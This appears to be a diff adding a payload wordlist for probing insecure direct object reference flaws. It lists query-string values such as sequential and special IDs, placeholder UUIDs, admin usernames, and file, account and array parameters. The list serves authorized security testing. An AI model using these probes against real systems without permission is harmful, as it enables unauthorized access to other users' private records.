@@ -1,0 +1,40 @@
+# IDOR (Insecure Direct Object Reference) Payloads
+
+# Sequential ID manipulation
+?id=1
+?id=2
+?id=100
+?id=1000
+
+# UUID manipulation
+?user_id=00000000-0000-0000-0000-000000000001
+?user_id=11111111-1111-1111-1111-111111111111
+
+# Username/email enumeration
+?user=admin
+?user=administrator
+?user=root
+?email=admin@example.com
+?username=test
+
+# File/Document IDs
+?file_id=1
+?doc_id=1
+?document=private.pdf
+?report_id=1
+
+# Account/Profile manipulation
+?account_id=1
+?profile_id=1
+?customer_id=1
+
+# Negative and special values
+?id=-1
+?id=0
+?id=999999
+?id=null
+?id=undefined
+
+# Array/Multiple IDs
+?id[]=1&id[]=2
+?ids=1,2,3
